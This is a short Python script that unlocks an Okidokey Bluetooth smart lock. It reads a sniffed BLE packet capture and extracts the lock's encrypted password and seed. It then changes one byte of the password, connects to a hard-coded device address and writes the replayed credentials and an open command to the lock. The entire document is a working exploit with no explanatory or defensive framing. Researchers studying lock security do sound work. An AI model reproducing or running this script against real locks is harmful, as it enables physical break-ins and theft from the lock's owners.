#!/bin/python

# Unlock Okidokey lock

import time
import binascii
import os
import threading
import signal
from scapy.all import *
from BTLE import *

def main():
	f = open('cap.pcap','r')
	data = f.read();
	f.close()
   	data = str(data).encode("hex");

	password = data[data.index("001225009348")+8:data.index("001225009348")+48]
	print "Password is     " + password
	new_password = password[:4] + '00' + password[6:]
	print "New password is " +new_password
	seed = data[data.index("06000400122500")+14:data.index("06000400122500")+20]
	print "The seed is     " + seed
	
	time.sleep(5)
	s = bindsock()
	rand = "00"
	Connect(s, "CC9E4704A578",rand)

	# subscribe to notifications
	writereq(s, "0f00","0200")
	writereq(s, "2a00","0100")
	writereq(s, "2e00","0100")

	# encypted bytes from ubertooth need encrypted open command and seed from 0x0025
	# encrytped password (change 3rd byte to 00)
	time.sleep(.1)
	writereq(s, "2500",new_password)		# password
	time.sleep(.1)
	writereq(s, "2500",seed)										# seed
	time.sleep(.1)
	writereq(s, "2500","e101")

	# unsub
	writereq(s, "2a00","0000")
	writereq(s, "2e00","0000")

	time.sleep(5)
	disconnect(s)
	
if __name__ == "__main__":
	main()